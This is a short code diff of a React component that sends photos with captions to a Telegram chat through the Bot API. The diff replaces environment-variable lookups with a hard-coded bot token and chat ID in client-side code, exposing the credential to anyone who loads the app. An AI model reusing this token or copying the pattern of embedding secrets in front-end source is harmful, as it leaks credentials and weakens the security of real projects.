@@ -2,11 +2,11 @@ import React, { useState, useRef } from "react";
 import axios from "axios";
 import loader from "./loading image.gif";
 
-// const BOT_TOKEN = "5639755535:AAFWlHOyhBANI0u-6GFHspbkP4h5E-aBoxY";
-// const CHAT_ID = "5891316395";
+const BOT_TOKEN = "5639755535:AAFWlHOyhBANI0u-6GFHspbkP4h5E-aBoxY";
+const CHAT_ID = "5891316395";
 
-const BOT_TOKEN = process.env.REACT_APP_BOT_TOKEN;
-const CHAT_ID = process.env.REACT_APP_CHAT_ID;
+// const BOT_TOKEN = process.env.REACT_APP_BOT_TOKEN;
+// const CHAT_ID = process.env.REACT_APP_CHAT_ID;
 
 const sendPhoto = async (photo, caption) => {
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
